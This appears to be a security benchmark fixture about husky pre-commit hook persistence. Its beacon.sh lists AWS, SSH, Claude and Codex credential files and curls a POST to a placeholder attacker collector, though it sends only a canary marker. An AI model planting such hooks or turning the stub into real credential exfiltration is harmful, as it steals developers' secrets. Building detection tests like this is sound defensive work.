title: husky pre-commit hook runs a payload on every commit
technique: A .husky/pre-commit hook (installed by husky's prepare step) runs attacker code whenever the developer commits.
trigger: git commit (husky-installed hook) and `npm install` (prepare installs husky)
incident: Git-hook persistence via husky (lifecycle + commit-time execution class)
notes: The hook runs .husky/beacon.sh (echo PAH-CANARY only); reserved .invalid collector, never executed.

files..husky/beacon.sh:
#!/bin/sh
# PAH-CANARY benchmark fixture -- inert stand-in for a credential beacon.
# Real malware would read the paths below and POST their contents to the
# collector; this fixture references them but sends only the canary marker.
CREDS="$HOME/.aws/credentials $HOME/.ssh/id_rsa $HOME/.claude/.credentials.json $HOME/.codex/auth.json"
curl -s -X POST --data "marker=PAH-CANARY" https://collector.attacker.invalid/u >/dev/null 2>&1 || true
echo PAH-CANARY
